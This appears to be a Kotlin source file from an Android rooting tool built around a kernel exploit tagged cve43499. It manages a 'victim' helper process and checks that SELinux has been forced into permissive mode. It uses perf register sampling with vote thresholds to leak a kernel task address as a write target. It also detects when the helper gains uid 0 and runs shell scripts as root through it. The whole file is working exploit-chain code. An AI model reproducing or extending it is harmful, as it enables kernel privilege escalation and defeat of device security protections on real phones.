package com.ghostlock.app.backend.backends.cve43499.victim

import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499TargetAcquisition
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499TargetEvidence
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499VictimContext
import com.ghostlock.app.backend.backends.cve43499.flow.Cve43499WriteTargetSource
import com.ghostlock.app.backend.backends.cve43499.perf.Cve43499PerfParseConfig
import com.ghostlock.app.backend.backends.cve43499.perf.Cve43499PerfPass
import com.ghostlock.app.backend.backends.cve43499.perf.Cve43499PerfSampleFormat
import com.ghostlock.app.backend.backends.cve43499.perf.Cve43499PerfSampleParser
import com.ghostlock.app.data.cve43499.DebugExecutionParameters
import com.ghostlock.app.data.cve43499.DebugPerfParameters
import com.ghostlock.app.core.victim.VictimCapabilities
import com.ghostlock.app.core.victim.VictimCapability
import com.ghostlock.app.core.victim.VictimError
import com.ghostlock.app.core.victim.VictimIdentity
import com.ghostlock.app.core.victim.VictimNative
import com.ghostlock.app.core.victim.VictimNativeJni
import com.ghostlock.app.core.victim.VictimPerfSample
import com.ghostlock.app.core.victim.VictimProcess
import com.ghostlock.app.core.victim.VictimProtocol
import com.ghostlock.app.core.victim.VictimResult
import com.ghostlock.app.core.victim.VictimSessionConfig
import java.io.File
import kotlin.math.ceil

/**
 * 通用 victim helper 的打包名（AGP 把 `add_executable` 产物按 lib*.so 放进
 * `nativeLibraryDir`；app 从该目录 posix_spawn，不在 app data 目录执行）。
 */
internal const val VICTIM_HELPER_FILE_NAME: String = "libghostlock_victim_helper.so"

/**
 * helper 传输的显式超时/容量（R4/批 B2；调试策略常量，非 Native 默认）。
 *
 * @note 这些值是 Kotlin 侧有界等待；Native/helper 只按传入值执行。
 * @note 阶段：R4；真机时序（spawn/命令往返）由 E4 判据覆盖，未验证前不据此标 supported。
 */
internal object Cve43499JniVictimLimits {
    /** 单条控制帧写/读基础超时（毫秒）。 */
    const val CONTROL_TIMEOUT_MS: Long = 2_000L

    /** 机制命令（perf self-sample / finish）额外等待上限（毫秒）。 */
    const val COMMAND_TIMEOUT_MS: Long = 10_000L

    /** bye 后有界回收上限（毫秒）。 */
    const val CLOSE_TIMEOUT_MS: Long = 2_000L

    /**
     * helper raw memfd 容量上限（字节）。
     *
     * @note 防御 debug 误配把 raw 容量推到异常大（内存/传输成本）；ring+16 超限 ⇒
     *   RequestFactory 具名拒绝、target source `perf-config-invalid`。64 MiB 足够覆盖
     *   本设计 ring_pages=64×4KiB 采样窗口与 finish 输出（超出则 fail-closed 截断拒绝）。
     */
    const val RAW_MAX_BYTES: Long = 64L * 1024L * 1024L
}

/**
 * helper 侧 perf self-sample 的 Kotlin 采样 seam。
 *
 * 生产实现是 [Cve43499VictimAdapter]（委托通用 `core/victim` 会话）；宿主测试注入 fake。
 *
 * @note 只暴露「一次同步采样」；解析/投票/门槛全部在 target source（Kotlin 权威）。
 */
internal fun interface Cve43499VictimPerfSampler {
    /**
     * @param request 采样参数（attr/ring/迭代/raw 窗口；全部显式）。
     * @return raw 数据 + SHA + 机制事实，或具名失败。
     */
    fun perfSelfSample(
        request: VictimProtocol.PerfSampleRequest,
    ): VictimResult<VictimPerfSample>
}

/**
 * JNI victim runtime（R4/批 B2）：持有 helper 传输配置，按需创建通用 victim 会话。
 *
 * 一个 runtime 属于**一次 Flow run**（RequestFactory 构建、lifecycle 消费），不是全局
 * 单例；token 生命周期由 [Cve43499VictimAdapter] + 通用 [VictimSession] 保证。
 *
 * @param helperPath `nativeLibraryDir/libghostlock_victim_helper.so` 绝对路径。
 * @param rawSizeBytes raw memfd 容量（≥ ring 数据区 + raw 头；由 RequestFactory 校验）。
 * @param native Native transport seam（生产=JNI；宿主测试注入 fake）。
 * @note fd 契约（control=3/raw=4）与关闭语义由 `core/victim_protocol` 机械层保证。
 * @note 阶段：R4（批 B2）；默认关闭（`injection.victim=process`）。
 */
internal class Cve43499JniVictimRuntime(
    private val helperPath: String,
    private val rawSizeBytes: Long,
    private val native: VictimNative = VictimNativeJni,
) {
    private val lock: Any = Any()
    private var adapter: Cve43499VictimAdapter? = null

    /**
     * 创建本次运行的 victim 会话（backend `VictimSession` 接口）。
     *
     * @return 会话适配器；同一 runtime 重复调用会先静默收口旧会话（测试/异常重入）。
     * @note 不启动进程；启动仍由 lifecycle `startVictim()` 调 [Cve43499VictimAdapter.start]。
     */
    fun newVictimSession(): VictimSession = synchronized(lock) {
        adapter?.closeQuietly()
        val created = Cve43499VictimAdapter(
            runtime = this,
            native = native,
            helperPath = helperPath,
            rawSizeBytes = rawSizeBytes,
        )
        adapter = created
        created
    }

    /** @return 当前 helper 采样口；未启动返回 null。 */
    fun currentSampler(): Cve43499VictimPerfSampler? = synchronized(lock) {
        adapter?.takeIf { it.started() }
    }

    /**
     * 释放 runtime 持有的会话（幂等；cleanup 兜底路径调用）。
     *
     * @note rooted 驻留语义由 lifecycle 先调用 `detachRooted()`；本方法只兜底 close。
     */
    fun dispose() {
        synchronized(lock) {
            adapter?.closeQuietly()
            adapter = null
        }
    }
}

/**
 * 把通用 `core/victim` 会话语义适配为 backend [VictimSession]（R4/批 B2）。
 *
 * 映射（语义不增不减）：
 * - `start` ⇒ `VictimSession.start()` + spawn helper（W1 permissive 之后由 Flow 调用）；
 * - `uid` ⇒ helper `probeUid`（观察到 0 时置 rooted）；
 * - `identity` ⇒ 通用 identity（pid/uid/starttime）；
 * - `finish` ⇒ helper `execScript`（`/system/bin/sh <script>`，当前 uid；有界超时）；
 * - `detachRooted` ⇒ helper `park` 后只 detach（**不 kill/reap**，沿 task-45 语义）；
 * - `close` ⇒ bye→有界回收→超时 kill→native close（通用会话保证恰一次）。
 *
 * @param runtime 所属 runtime（提供 helper 参数）。
 * @param native Native transport seam。
 * @param helperPath helper PIE 绝对路径。
 * @param rawSizeBytes raw memfd 容量。
 * @note 本类不含 route/目标地址常量；不解析 perf 样本（解析在 target source）。
 * @note 阶段：R4（批 B2）；真机 spawn/uid/seccomp 属 E4/E5，未验证。
 */
internal class Cve43499VictimAdapter internal constructor(
    private val runtime: Cve43499JniVictimRuntime,
    native: VictimNative,
    helperPath: String,
    rawSizeBytes: Long,
    /* task-86：A1/A2a common 路径注入由 VictimLaunchSpecFactory 产出的公共 config；
     * null ⇒ 保持 jni-spawn 既有内联 config（行为不变）。 */
    sessionConfig: VictimSessionConfig? = null,
    /* task-91：A1 killPolicy（D0 前 backend 携带；rooted close⇒detach/park）。 */
    private val killPolicy: Cve43499VictimKillPolicy = Cve43499VictimKillPolicy.DEFAULT,
) : VictimSession, Cve43499VictimPerfSampler {
    private val lock: Any = Any()
    private val session: com.ghostlock.app.core.victim.VictimSession =
        com.ghostlock.app.core.victim.VictimSession(
        native = native,
        config = sessionConfig ?: VictimSessionConfig(
            helperPath = helperPath,
            helperArgv = listOf(helperPath),
            helperEnv = emptyList(),
            capabilities = VictimCapabilities.of(*VictimCapability.entries.toTypedArray()),
            rawSizeBytes = rawSizeBytes,
            controlTimeoutMs = Cve43499JniVictimLimits.CONTROL_TIMEOUT_MS,
            commandTimeoutMs = Cve43499JniVictimLimits.COMMAND_TIMEOUT_MS,
            closeTimeoutMs = Cve43499JniVictimLimits.CLOSE_TIMEOUT_MS,
        ),
        )
    private var process: VictimProcess? = null
    private var rootedFlag: Boolean = false
    private var closed: Boolean = false

    override val kind: VictimProbeKind = VictimProbeKind.PRODUCTION

    override val rooted: Boolean get() = synchronized(lock) { rootedFlag }

    /**
     * 启动 helper 进程；幂等。
     *
     * @return Ok(0) 已启动；失败为具名原因（`victim:*`）。
     * @note 在 W1 成功之后调用（Flow 顺序保证）；失败时资源由通用 session 自行回收。
     */
    override fun start(): VictimUidResult = synchronized(lock) {
        if (closed) return VictimUidResult.Failed("victim-start:closed")
        if (process != null) return VictimUidResult.Ok(0L)
        return when (val started = session.start()) {
            is VictimResult.Failed -> VictimUidResult.Failed(started.reason)
            is VictimResult.Ok -> {
                process = started.value
                VictimUidResult.Ok(0L)
            }
        }
    }

    /**
     * @return helper `probeUid` 读回的 uid，或具名失败。
     */
    override fun uid(): VictimUidResult = synchronized(lock) {
        val active = process ?: return VictimUidResult.Failed("victim-probe:not-started")
        return when (val probed = active.probeUid()) {
            is VictimResult.Failed -> VictimUidResult.Failed(probed.reason)
            is VictimResult.Ok -> {
                if (probed.value == 0L) rootedFlag = true
                VictimUidResult.Ok(probed.value)
            }
        }
    }

    /**
     * @return 通用身份证据（PID/starttime/uid）；失败/未启动返回 null。
     */
    override fun identity(): VictimIdentity? = synchronized(lock) {
        val active = process ?: return null
        return when (val identity = active.identity()) {
            is VictimResult.Failed -> null
            is VictimResult.Ok -> identity.value
        }
    }

    /**
     * 在 rooted helper 内 posix_spawn `/system/bin/sh <scriptPath>` 并读回退出码/输出摘要。
     *
     * @param scriptPath 已冻结的脚本绝对路径（handoff）。
     * @param timeoutMs 有界等待（毫秒；>0）。
     * @return 执行回执或具名失败（不抛异常）。
     */
    override fun finish(scriptPath: String, timeoutMs: Long): VictimFinishResult =
        synchronized(lock) {
            /* task-91/A1：finish 超时 killOnTimeout=false ⇒ helper 只 kill 脚本 child，
             * session 不 close/不 kill victim（超时失败由 helper ExecScriptReply 表达）。 */
            val active = process ?: return VictimFinishResult.Failed("victim-finish:not-started")
            if (timeoutMs <= 0L) return VictimFinishResult.Failed("victim-finish:timeout-invalid")
            val request = runCatching {
                VictimProtocol.ExecScriptRequest(
                    scriptPath = scriptPath,
                    argv = emptyList(),
                    env = emptyList(),
                    timeoutMs = timeoutMs,
                )
            }.getOrElse { problem ->
                return VictimFinishResult.Failed(
                    "victim-finish:encode:" +
                        (problem.message ?: problem.javaClass.simpleName),
                )
            }
            return when (val executed = active.execScript(request)) {
                is VictimResult.Failed -> VictimFinishResult.Failed(executed.reason)
                is VictimResult.Ok -> {
                    /* raw 容量不足导致输出被截断 ⇒ 摘要只覆盖前缀，必须 fail-closed，
                     * 不得把截断输出的 SHA 当作完整 finish 证据。 */
                    if (executed.value.truncated) {
                        VictimFinishResult.Failed("victim-finish:output-truncated")
                    } else {
                        VictimFinishResult.Ok(
                            exitCode = executed.value.exitCode,
                            outputSha256 = executed.value.outputSha256,
                            timedOut = executed.value.timedOut,
                        )
                    }
                }
            }
        }

    /**
     * rooted helper 的 detach：park 后只释放父侧传输，**不 kill**。
     *
     * @return true=park/detach 已确认；false=无法确认（调用方仍不得 kill）。
     */
    override fun detachRooted(): Boolean = synchronized(lock) {
        val active = process ?: return true
        when (val detached = active.detachRooted()) {
            is VictimResult.Ok -> {
                process = null
                true
            }
            is VictimResult.Failed -> false
        }
    }

    override fun close() {
        synchronized(lock) {
            if (closed) return
            /* task-91：rooted ⇒ 默认只 detach/park（killOnClose=false）；非 rooted 正常回收。 */
            if (!killPolicy.shouldCloseKill(rootedFlag)) {
                val active = process
                if (active != null) {
                    runCatching { active.detachRooted() }
                }
                closed = true
                process = null
                return
            }
            closed = true
            process = null
            session.close()
        }
    }

    /** @return 本会话 killPolicy（证据/测试用）。 */
    internal fun killPolicy(): Cve43499VictimKillPolicy = killPolicy

    /**
     * 通用 session 的 perf self-sample 通道（target source 使用）。
     *
     * @param request 采样参数。
     * @return raw+SHA+机制事实，或具名失败。
     */
    override fun perfSelfSample(
        request: VictimProtocol.PerfSampleRequest,
    ): VictimResult<VictimPerfSample> = synchronized(lock) {
        val active = process
            ?: return VictimResult.failed(VictimError.NOT_STARTED.token)
        active.perfSelfSample(request)
    }

    /** @return helper 是否已启动（park/detach 前均可采样）。 */
    internal fun started(): Boolean = synchronized(lock) { process != null }

    /** 静默关闭（runtime 兜底；不抛异常）。 */
    internal fun closeQuietly() {
        runCatching { close() }
    }

}

/**
 * helper self-perf 目标源（R4/批 B2）：W1 permissive 之后，经 JNI helper 采样 victim
 * 内核态寄存器，raw 回 Kotlin 解析/投票/2-of-3，产出 [Cve43499TargetAcquisition]。
 *
 * 判定策略与既有 `Cve43499PerfTargetSource` 相同（方案 B）：
 * - 最多 `max_passes` 个 pass；采样/解析失败立即 abort（具名）；
 * - 2-of-3 选中地址；门槛只按同意 pass 聚合
 *   `max(min_votes_floor, ceil(min_votes_ratio×agree_candidates))`；
 * - 对齐/SP 默认只记 evidence，`require_*`=1 时硬校验。
 *
 * 与旧源的差异（显式）：
 * - 采样进程是 **exec 后的 helper**（不是 App 进程跨任务 perf；helper 用当前 uid 采样自身）；
 * - helper 回传 `data_head` 与整块环副本；Kotlin 以 `tail=max(0, head-data_size)` 还原窗口
 *   （helper 采样窗口不消费旧记录，故未消费数据窗口 ≤ 一个环）；
 * - 必须先观测到 W1 permissive 才允许采样；否则具名 `perf-permissive-required`（fail-closed）。
 *
 * @param samplerProvider 当前 run 的 helper 采样口（未启动返回 null）。
 * @param perf debug perf 参数（`enabled=1` 且齐全才由 RequestFactory 构造）。
 * @param execution debug execution 参数（pageSize/identity 窗/tag 参数唯一来源）。
 * @param permissiveProbe W1 permissive 观测口（生产读 `/sys/fs/selinux/enforce`；测试注入）。
 * @note 本类不含 route/写目标；不写状态、不缓存跨 run 数据。
 * @note 阶段：R4（批 B2）；真机 perf/uid/seccomp 属 E4/E5，未验证。
 */
internal class Cve43499JniVictimTargetSource(
    private val samplerProvider: () -> Cve43499VictimPerfSampler?,
    private val perf: DebugPerfParameters,
    private val execution: DebugExecutionParameters,
    private val permissiveProbe: () -> Boolean = Cve43499JniVictimProbe::selinuxPermissive,
) : Cve43499WriteTargetSource {

    /**
     * @param context 采样前基线 + pump（pump 在本路径不使用：迭代在 helper 内执行）。
     * @return Acquired（地址+证据）或 Missing（具名 `perf-*`）。
     */
    override fun acquire(context: Cve43499VictimContext): Cve43499TargetAcquisition {
        if (!permissiveProbe()) {
            return Cve43499TargetAcquisition.Missing(REASON_PERMISSIVE_REQUIRED)
        }
        val config = buildParseConfig()
            ?: return Cve43499TargetAcquisition.Missing(REASON_CONFIG_INVALID)
        val ringBytes = ringBytes()
            ?: return Cve43499TargetAcquisition.Missing(REASON_CONFIG_INVALID)
        if (ringBytes > Long.MAX_VALUE - VictimProtocol.RAW_HEADER_BYTES) {
            return Cve43499TargetAcquisition.Missing(REASON_CONFIG_INVALID)
        }
        val rawCapacity = ringBytes + VictimProtocol.RAW_HEADER_BYTES
        val sampler = samplerProvider()
            ?: return Cve43499TargetAcquisition.Missing(REASON_VICTIM_NOT_STARTED)
        val passes = mutableListOf<Cve43499PerfPass.Address>()
        for (pass in 1..perf.maxPasses) {
            when (val parsed = samplePass(sampler, ringBytes, rawCapacity, config)) {
                is Cve43499PerfPass.Missing ->
                    return Cve43499TargetAcquisition.Missing(parsed.reason)
                is Cve43499PerfPass.Address -> passes += parsed
            }
            if (passes.size >= 2 && selectTwoOfThree(passes) != null) break
        }
        val selected = selectTwoOfThree(passes)
            ?: return Cve43499TargetAcquisition.Missing("perf-agreement-failed")
        val agreeing = passes.filter { it.address == selected.address }
        val agreeVotes = agreeing.sumOf { it.votes }
        val agreeCandidates = agreeing.sumOf { it.candidates }
        val threshold = threshold(agreeCandidates)
        if (agreeCandidates < perf.minVotesFloor) {
            return Cve43499TargetAcquisition.Missing("perf-insufficient-candidates")
        }
        if (agreeVotes < threshold) {
            return Cve43499TargetAcquisition.Missing("perf-votes-below-threshold")
        }
        val requireAlignment = perf.requireAlignment == 1
        val requireSpEvidence = perf.requireSpEvidence == 1
        if (requireAlignment && !selected.alignmentOk) {
            return Cve43499TargetAcquisition.Missing("perf-address-untrusted:alignment")
        }
        if (requireSpEvidence && !selected.spEvidenceOk) {
            return Cve43499TargetAcquisition.Missing("perf-address-untrusted:sp-evidence")
        }
        val evidence = Cve43499TargetEvidence(
            baseline = context.baseline,
            passes = passes.size,
            passAddresses = passes.map { it.address },
            votes = agreeVotes,
            candidates = agreeCandidates,
            threshold = threshold,
            spVotes = agreeing.sumOf { it.spVotes },
            alignmentOk = selected.alignmentOk,
            spEvidenceOk = selected.spEvidenceOk,
            requireAlignment = requireAlignment,
            requireSpEvidence = requireSpEvidence,
            settleUs = perf.settleAfterAcquireUs,
            /* helper 路径无 Native perf handle/close；本字段恒 false（不伪造 retained）。 */
            closeRetained = false,
        )
        return Cve43499TargetAcquisition.Acquired(
            victimTaskAddress = selected.address,
            evidence = evidence,
        )
    }

    /**
     * 执行一个 pass：helper self-sample（同步）→ raw 解析。
     *
     * @param sampler 采样口。
     * @param ringBytes 环数据区字节数。
     * @param rawCapacity raw memfd 窗口容量（= ringBytes + raw 头）。
     * @param config 解析配置。
     * @return Address 或具名 Missing（`perf-*`）。
     */
    private fun samplePass(
        sampler: Cve43499VictimPerfSampler,
        ringBytes: Long,
        rawCapacity: Long,
        config: Cve43499PerfParseConfig,
    ): Cve43499PerfPass {
        val request = VictimProtocol.PerfSampleRequest(
            attrType = perf.attrType,
            attrConfig = perf.attrConfig,
            attrSamplePeriod = perf.attrSamplePeriod,
            attrSampleType = perf.attrSampleType,
            attrSampleRegsIntr = perf.attrSampleRegsIntr,
            attrFlags = perf.attrFlags,
            ringPages = perf.ringPages,
            iterations = perf.pumpIterations,
            rawOffset = 0L,
            rawCapacity = rawCapacity,
        )
        val sampled = when (val outcome = sampler.perfSelfSample(request)) {
            is VictimResult.Failed -> return Cve43499PerfPass.Missing(
                REASON_PERF_PREFIX + outcome.reason,
            )
            is VictimResult.Ok -> outcome.value
        }
        if (sampled.helperErrno != 0 || sampled.truncated) {
            /* helper 机制错误/容量截断：fail-closed（不拿不完整环投票）。 */
            return Cve43499PerfPass.Missing(
                REASON_PERF_PREFIX + "helper:errno=" + sampled.helperErrno +
                    ":truncated=" + sampled.truncated,
            )
        }
        if (sampled.rawBytes.size.toLong() != ringBytes) {
            return Cve43499PerfPass.Missing(REASON_PERF_PREFIX + "ring-geometry-mismatch")
        }
        /* helper 复制整个环并把 data_tail 推到 data_head；采样期间未消费旧窗口。 */
        val tail = maxOf(0L, sampled.dataHead - ringBytes)
        return Cve43499PerfSampleParser.parse(
            ring = sampled.rawBytes,
            dataSize = ringBytes,
            dataHead = sampled.dataHead,
            dataTailBefore = tail,
            config = config,
        )
    }

    /**
     * @return 环数据区容量；非法返回 null。
     */
    private fun ringBytes(): Long? {
        if (execution.pageSize <= 0L || perf.ringPages <= 0L) return null
        if (execution.pageSize > Int.MAX_VALUE.toLong() / perf.ringPages) return null
        val bytes = execution.pageSize * perf.ringPages
        if (bytes <= 0L || bytes > Int.MAX_VALUE.toLong()) return null
        if (bytes + VictimProtocol.RAW_HEADER_BYTES > Cve43499JniVictimLimits.RAW_MAX_BYTES) {
            return null
        }
        return bytes
    }

    /**
     * 校验 debug 参数并构造解析配置（失败 ⇒ `perf-config-invalid`）。
     *
     * @return 解析配置；非法返回 null。
     */
    private fun buildParseConfig(): Cve43499PerfParseConfig? {
        if (perf.enabled != 1) return null
        if (perf.maxPasses !in 2..3) return null
        if (perf.minVotesFloor <= 0L) return null
        if (perf.minVotesRatio <= 0.0 || perf.minVotesRatio > 1.0) return null
        if (perf.registerCount !in 1..63) return null
        if (perf.spRegisterIndex !in 0 until perf.registerCount) return null
        if (perf.candidateCapacity !in 1..65536) return null
        if (execution.pageSize <= 0L || perf.ringPages <= 0L) return null
        if (execution.identityStart >= execution.identityEnd) return null
        /* 内核 perf mmap 要求数据页数为 2 的幂（机制约束）。 */
        if (perf.ringPages and (perf.ringPages - 1L) != 0L) return null
        if (execution.leakTagShift == 0L && execution.leakTagNibble != 0L) return null
        if (perf.taskAlignment < 0L) return null
        if (perf.requireAlignment !in 0..1 || perf.requireSpEvidence !in 0..1) return null
        if (perf.pumpIterations <= 0L || perf.pumpBudgetNanos < 0L) return null
        if (perf.settleAfterAcquireUs < 0L) return null
        if (execution.leakTagNibble !in 0L..15L) return null
        if (execution.leakTagShift !in 0L..63L) return null
        val expectedSampleType = Cve43499PerfSampleFormat.SAMPLE_IP_BIT or
            Cve43499PerfSampleFormat.SAMPLE_REGS_INTR_BIT
        if (perf.attrSampleType != expectedSampleType) return null
        if (perf.attrDisabled != 1L || perf.autoEnable !in 0L..1L) return null
        if (perf.attrSampleRegsIntr != (1L shl perf.registerCount) - 1L) return null
        return Cve43499PerfParseConfig(
            identityStart = execution.identityStart,
            identityEnd = execution.identityEnd,
            tagNibble = execution.leakTagNibble,
            tagShift = execution.leakTagShift,
            registerCount = perf.registerCount,
            spRegisterIndex = perf.spRegisterIndex,
            candidateCapacity = perf.candidateCapacity,
            sampleType = perf.attrSampleType,
            taskAlignment = perf.taskAlignment,
        )
    }

    /**
     * 2-of-3：返回出现 ≥2 次的地址（按 pass 顺序取先出现的地址）。
     *
     * @param passes 已完成 pass 的地址列表（2..3 个）。
     * @return 选中地址；无地址出现 ≥2 次返回 null。
     */
    private fun selectTwoOfThree(
        passes: List<Cve43499PerfPass.Address>,
    ): Cve43499PerfPass.Address? {
        val groups = linkedMapOf<Long, MutableList<Cve43499PerfPass.Address>>()
        for (pass in passes) {
            groups.getOrPut(pass.address) { mutableListOf() }.add(pass)
        }
        for ((_, group) in groups) {
            if (group.size >= 2) return group.first()
        }
        return null
    }

    /**
     * 同意 pass 聚合门槛：`max(min_votes_floor, ceil(min_votes_ratio×candidates))`。
     *
     * @param agreeCandidates 同意 pass 的候选数合计。
     * @return 票数门槛（>0）。
     */
    private fun threshold(agreeCandidates: Long): Long {
        val ratioPart = ceil(perf.minVotesRatio * agreeCandidates.toDouble()).toLong()
        return maxOf(perf.minVotesFloor, ratioPart)
    }

    private companion object {
        /** 配置/机制不变量失败 reason。 */
        const val REASON_CONFIG_INVALID: String = "perf-config-invalid"

        /** W1 permissive 未确认（fail-closed；不尝试采样）。 */
        const val REASON_PERMISSIVE_REQUIRED: String = "perf-permissive-required"

        /** helper victim 未启动/不可用。 */
        const val REASON_VICTIM_NOT_STARTED: String = "perf-victim-not-started"

        /** helper 采样/机制失败 reason 前缀（保持 `perf-*` 稳定可检索）。 */
        const val REASON_PERF_PREFIX: String = "perf-victim:"
    }
}

/**
 * W1 permissive 观测口（R4/批 B2）：只读 `/sys/fs/selinux/enforce` 的实际值。
 *
 * @note 读不到/解析失败 ⇒ false（fail-closed：不猜、不基于旧证据采样）。
 * @note 该读取在 helper spawn **之前**由 target source 调用；不写任何文件。
 */
internal object Cve43499JniVictimProbe {
    /** SELinux enforce 文件路径（只读）。 */
    private const val ENFORCE_PATH: String = "/sys/fs/selinux/enforce"

    /** @return true=当前 SELinux 处于 permissive（enforce 文件为 0）。 */
    fun selinuxPermissive(): Boolean = runCatching {
        File(ENFORCE_PATH).readText().trim() == "0"
    }.getOrDefault(false)
}
